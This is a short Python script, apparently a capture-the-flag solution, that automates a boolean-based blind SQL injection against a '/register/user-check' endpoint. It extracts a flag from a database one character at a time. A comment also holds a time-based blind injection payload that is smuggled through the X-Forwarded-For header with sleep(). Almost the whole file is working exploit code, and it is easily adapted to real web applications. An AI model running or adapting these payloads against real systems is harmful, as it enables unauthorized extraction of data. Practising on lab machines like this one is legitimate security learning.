#!/bin/python3

import requests
import time
import string

# create character list A-Z 0-9 {} :
# curl '10.10.26.93' -H "X-Forwarded-For: 127.0.0.1' AND (SELECT sleep(2) from flag where substr(flag.flag,1,1) = 'T') AND '1'='1"


## FYI dictionary is just a string. in a "for" loop, it iterates through its characters by design, just remembered.
ip = "10.10.3.152"
dictionary = string.ascii_uppercase + string.digits + '{' + '}' + ':'

def main():
	host = f"http://{ip}/register/user-check"
	payload = ""
	flag_index = 1
	final_flag = ""
	while 1:
		for character in dictionary:
			payload = f"username=admin' AND EXISTS(SELECT flag FROM flag WHERE SUBSTR(flag,{flag_index},1) = '{character}');"
			request = requests.get(host, params=payload)
			if ("false" in request.text):
				final_flag = final_flag + character
				print("FOUND CHAR: " + final_flag)
				flag_index += 1
				break
		if len(final_flag) == 43:
			print(f"!!!FINISHED!!!\nFinal_flag: {final_flag}")
			break
if __name__ == '__main__':
	main()